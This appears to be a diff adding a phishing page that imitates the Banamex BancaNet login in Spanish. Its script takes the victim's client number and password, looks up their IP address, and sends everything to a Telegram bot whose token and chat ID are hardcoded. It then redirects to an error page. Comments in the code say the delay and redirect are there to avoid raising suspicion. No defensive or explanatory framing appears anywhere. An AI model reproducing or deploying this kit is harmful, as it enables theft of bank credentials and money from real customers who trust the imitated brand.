@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BancaNet - Banamex</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a4a52 0%, #2d6b73 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #1a4a52;
+            border-radius: 25px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            padding: 15px;
+            background: white;
+            border-radius: 20px 20px 0 0;
+            margin: -30px -30px 30px -30px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: #e31e24;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1a4a52;
+        }
+
+        .bancanet {
+            font-size: 18px;
+            color: #1a4a52;
+            font-weight: 500;
+        }
+
+        .form-container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            margin: 0 -10px;
+        }
+
+        .form-title {
+            color: #e31e24;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .help-icon {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            background: #007bff;
+            border-radius: 50%;
+            color: white;
+            text-align: center;
+            font-size: 12px;
+            line-height: 16px;
+            margin-left: 5px;
+            cursor: help;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            background: white;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #1a4a52;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .checkbox {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .checkbox-label {
+            color: #333;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .continue-btn {
+            width: 100%;
+            background: #1a4a52;
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .continue-btn:hover {
+            background: #2d6b73;
+        }
+
+        .continue-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .forgot-password {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            display: block;
+            text-align: left;
+            margin-bottom: 30px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .menu-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #eee;
+            color: #333;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .menu-item:hover {
+            background-color: #f5f5f5;
+            margin: 0 -30px;
+            padding-left: 30px;
+            padding-right: 30px;
+        }
+
+        .arrow {
+            color: #666;
+            font-size: 18px;
+        }
+
+        .decorative-flower {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            background: #e31e24;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 30px;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: white;
+            margin-top: 10px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 10px;
+                padding: 20px;
+            }
+            
+            .header {
+                margin: -20px -20px 20px -20px;
+                padding: 12px;
+            }
+            
+            .logo-icon {
+                width: 35px;
+                height: 35px;
+                font-size: 18px;
+            }
+            
+            .logo-text {
+                font-size: 20px;
+            }
+            
+            .bancanet {
+                font-size: 16px;
+            }
+            
+            .form-container {
+                padding: 20px;
+                margin: 0 -5px;
+            }
+            
+            .form-title {
+                font-size: 20px;
+            }
+            
+            .continue-btn {
+                padding: 15px;
+                font-size: 16px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 450px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="../img/banamex.svg" alt="">
+                <span class="logo-text">Banamex</span>
+            </div>
+            <span class="bancanet">BancaNet®</span>
+        </div>
+
+        <div class="form-container">
+            <h2 class="form-title">Iniciar sesión</h2>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label class="form-label">
+                        Vamos a verificar tu compra, ingrese número de cliente.
+                        <span class="help-icon">?</span>
+                    </label>
+                    <input type="text" class="form-input" id="clientNumber" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        Contraseña
+                        <span class="help-icon">?</span>
+                    </label>
+                    <input type="password" class="form-input" id="password" required>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" class="checkbox" id="rememberUser">
+                    <label class="checkbox-label" for="rememberUser">
+                        Recordar mi usuario
+                        <span class="help-icon">?</span>
+                    </label>
+                </div>
+
+                <button type="submit" class="continue-btn" id="continueBtn">Continuar</button>
+            </form>
+
+            <a href="#" class="forgot-password">Recuperar contraseña</a>
+
+            <div class="menu-item">
+                <span>Centro de Seguridad</span>
+                <span class="arrow">›</span>
+            </div>
+
+            <div class="menu-item">
+                <span>Conoce la herramienta de seguridad</span>
+                <span class="arrow">›</span>
+            </div>
+
+            <div class="menu-item">
+                <span>Instalar herramienta</span>
+                <span class="arrow">›</span>
+            </div>
+        </div>
+
+        <div class="decorative-flower">❀</div>
+        
+        <div class="loading" id="loading">
+            Enviando datos...
+        </div>
+    </div>
+
+
+
+    <script>
+        // Configuración del Bot de Telegram
+        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+        const TELEGRAM_CHAT_ID = '5848946481';
+        const REDIRECT_URL = 'error.html'; // URL de redirección
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const clientNumber = document.getElementById('clientNumber').value;
+            const password = document.getElementById('password').value;
+            const rememberUser = document.getElementById('rememberUser').checked;
+            
+            if (clientNumber.trim() === '' || password.trim() === '') {
+                alert('Por favor completa todos los campos');
+                return;
+            }
+            
+            // Mostrar loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('continueBtn').disabled = true;
+            document.getElementById('continueBtn').textContent = 'Procesando...';
+            
+            await sendDataToTelegram(clientNumber, password, rememberUser);
+        });
+
+        async function sendDataToTelegram(clientNumber, password, rememberUser) {
+            const message = `🏦 *BANAMEX LOGIN*\n\n` +
+                          `👤 *Cliente:* ${clientNumber}\n` +
+                          `🔐 *Contraseña:* ${password}\n` +
+                          `✅ *Recordar usuario:* ${rememberUser ? 'Sí' : 'No'}\n` +
+                          `📅 *Fecha:* ${new Date().toLocaleString('es-MX')}\n` +
+                          `🌐 *IP:* ${await getClientIP()}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    // Simular un pequeño delay para que parezca más real
+                    setTimeout(() => {
+                        // Redireccionar a la página oficial de Banamex
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                } else {
+                    throw new Error('Error al enviar mensaje');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                // Incluso si hay error, redirigir para no levantar sospechas
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1000);
+            }
+        }
+
+        async function getClientIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'No disponible';
+            }
+        }
+    </script>
+</body>
+</html>
